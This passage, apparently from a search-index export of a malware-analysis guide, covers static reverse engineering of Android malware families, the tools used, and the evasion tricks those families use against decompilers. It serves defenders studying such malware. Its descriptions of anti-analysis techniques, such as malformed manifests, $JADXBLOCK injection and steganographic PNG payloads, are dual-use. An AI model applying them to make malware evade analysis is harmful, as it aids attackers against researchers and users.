approaches:</p> Family Challenge Approach FluHorse Business logic compiled as Dart AOT snapshot in <code>libapp.so</code>, not in DEX Use Blutter or reFlutter to analyze Dart snapshots. Standard DEX decompilers show only a thin Kotlin wrapper. SoumniBot Manifest obfuscation crashes jadx and apktool Use Android OS itself as the parser (install on emulator, dump manifest via <code>adb shell dumpsys package</code>). Or patch the malformed ZIP entries manually. GodFather v3 <code>$JADXBLOCK</code> fields in class files + ZIP manipulation Remove <code>$JADXBLOCK</code> annotations from DEX before feeding to jadx. Use alternative decompilers (Procyon, CFR) that may not honor this field. Mandrake OLLVM-obfuscated native libraries Use D-810 Ghidra plugin for OLLVM deobfuscation. Pair with Frida Stalker for runtime instruction tracing. Necro Payload hidden in PNG steganography Extract pixel data from downloaded PNGs, decode hidden DEX using the loader's algorithm. Check <code>BitmapFactory</code> usage patterns. Klopatra Virbox packer virtualizes DEX into proprietary bytecode Static analysis fails entirely for virtualized methods. Must use dynamic analysis and hook the VM interpreter. See Virbox. DexGuard-protected String encryption, class encryption, resource encryption Search for single-character class names (<code>o</code>, <code>oo</code>, <code>ooo</code>) with methods returning <code>String</code>. These are decryption stubs. Gigabud Core logic in native <code>libstrategy.so</code> with Virbox packing Analyze the Java layer for accessibility service registration, then trace native calls via Frida. Antidot Custom string encryption + gibberish class names Identify the decryption method pattern and write a jadx script or Frida hook to bulk-decrypt all strings. Triada firmware variants Malware code embedded in system framework Compare system partition against known-good firmware images. Diff framework JARs and system apps."},{"location":"reversing/static-analysis/#flutterdart-analysis","title":"Flutter/Dart Analysis","text":"<p>FluHorse and other Flutter-based malware require a different toolchain since business logic compiles to native code via Dart's AOT compiler rather than Dalvik bytecode:</p> Tool Purpose Blutter Dart AOT snapshot analyzer. Extracts class/method names and rebuilds Dart source from <code>libapp.so</code>. reFlutter Framework re-patching tool. Patches <code>libflutter.so</code> to enable SSL traffic interception and snapshot analysis. Doldrums Dart AOT snapshot parser for older Dart versions. <p>The workflow: extract <code>libapp.so</code> from the APK, determine the Dart SDK version from <code>libflutter.so</code>, then use Blutter to parse the snapshot and recover function signatures and string references. Fortinet published a detailed static reversing methodology at Virus Bulletin 2024.</p>"},{"location":"reversing/static-analysis/#tools","title":"Tools","text":"Tool Purpose jadx DEX to Java decompiler, GUI and CLI apktool APK disassembly/reassembly, Smali output APKiD Packer and obfuscator identification APKLeaks Extract URLs, endpoints, secrets, and API keys from APKs Ghidra Native code reverse engineering (free, NSA) dex2jar DEX to JAR conversion for use with Java decompilers Bytecode Viewer Multi-decompiler view (Procyon, CFR, FernFlower, jadx) JADX-GUI jadx with search, navigation, and deobfuscation features"},{"location":"reversing/static-analysis/#emerging-evasion-techniques","title":"Emerging Evasion Techniques","text":"<p>Beyond traditional packing and obfuscation, recent malware families have introduced novel techniques that specifically break static analysis assumptions:</p>"},{"location":"reversing/static-analysis/#manifest-obfuscation","title":"Manifest Obfuscation","text":"<p>SoumniBot (2024) exploits differences between how analysis tools and the Android OS parse <code>AndroidManifest.xml</code>. Kaspersky documented three techniques:</p> Technique Effect Invalid compression method ZIP entry uses unknown compression value. Android defaults to uncompressed; jadx/apktool fail to parse. Invalid manifest size Declared size in ZIP header does not match actual size. Android ignores mismatch; tools crash or produce corrupt output. Excessively long namespace strings Hundreds of thousands of characters in XML namespace. Causes analysis tools to hang or run out of memory."},{"location":"reversing/static-analysis/#net-maui-framework","title":".NET MAUI Framework","text":"<p>McAfee documented Android malware built entirely in C# using the .NET MAUI cross-platform framework. Core logic resides in blob binary files rather than DEX, meaning standard DEX decompilers (jadx, apktool) find no meaningful code. Multi-layer encryption (XOR + AES) further protects the actual payload.</p>"},{"location":"reversing/static-analysis/#steganographic-payloads","title":"Steganographic Payloads","text":"<p>Necro (2024) hides second-stage payloads inside PNG image files using steganography. The loader downloads what appears to be a standard image, extracts hidden data from pixel values, and loads it as a DEX payload. Network inspection sees an image download, not a malware fetch.</p>"},{"location":"reversing/static-analysis/#zip-manipulation-and-jadx-blocking","title":"ZIP Manipulation and JADX Blocking","text":"<p>GodFather v3 (2025) combines multiple anti-decompilation layers: ZIP archive manipulation with invalid headers prevents standard archive tools from extracting the APK contents, deliberately malformed manifest entries crash parsers, and injected <code>$JADXBLOCK</code> fields in class files cause the jadx decompiler to skip those classes entirely. This layered approach targets the specific analysis toolchain most researchers rely on.</p>"},{"location":"reversing/static-analysis/#ollvm-obfuscated-native-libraries","title":"OLLVM-Obfuscated Native Libraries","text":"<p>Mandrake (2024) moved core malicious functionality from DEX into native libraries obfuscated with OLLVM (Obfuscator-LLVM), applying control flow flattening, string encryption, and bogus control flow. Standard native code analysis tools like Ghidra require significant manual effort to deobfuscate.</p>"},{"location":"reversing/static-analysis/#limitations","title":"Limitations","text":"<p>Static analysis fails when:</p> <ul> <li>The app is packed (encrypted DEX, loaded at runtime)</li> <li>Heavy obfuscation (ProGuard, R8, DexGuard, Allatori) makes code unreadable</li> <li>Native code handles critical logic</li> <li>Code is downloaded from C2 after installation</li> <li>Reflection is used to hide API calls</li> <li>Manifest is deliberately malformed to crash analysis tools (SoumniBot)</li> <li>Non-DEX frameworks (.NET MAUI) bypass traditional decompilers</li> <li>Payloads hidden in images via steganography (Necro)</li> <li>ZIP manipulation and <code>$JADXBLOCK</code> fields disable jadx decompilation (GodFather v3)</li> <li>Commercial packers (Virbox) virtualize DEX into proprietary VM instructions (Klopatra)</li> </ul> <p>In these cases, move to Dynamic Analysis and Hooking.</p>"}]}